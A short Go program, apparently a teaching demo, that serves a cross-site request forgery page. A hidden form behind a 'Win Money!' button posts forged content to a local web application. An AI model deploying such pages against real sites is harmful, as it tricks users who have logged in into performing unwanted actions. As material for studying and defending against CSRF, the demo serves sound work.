package main

import (
	"fmt"
	"net/http"
)

func main() {
	http.HandleFunc("/attack", attack)

	http.ListenAndServe(":1234", nil)
}

func attack(w http.ResponseWriter, r *http.Request) {
	fmt.Fprint(w, `
<html>
<body>
  <form method="post" action="http://localhost:8080/form/post"  accept-charset="UTF-8">
    <input type="hidden" name="content" value="cracked">
    <input type="submit" value="Win Money!">
  </form>
</body>
</html>`)
}
